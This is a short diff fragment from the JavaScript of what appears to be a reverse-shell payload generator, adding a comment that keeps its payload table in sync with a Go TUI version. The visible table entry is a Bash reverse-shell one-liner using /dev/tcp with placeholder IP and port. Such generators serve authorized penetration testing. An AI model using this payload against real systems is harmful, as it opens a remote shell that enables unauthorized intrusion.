@@ -2,6 +2,8 @@
 import { esc, fmtBytes } from './state.js';
 import { toast } from './modals.js';
 
+// SHELL_DB is mirrored in tui/generator.go (var shellDB) so the TUI generator
+// offers the same payloads in the same order — keep the two in sync.
 const SHELL_DB = {
   // Bash
   "Bash -i":                    "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1",
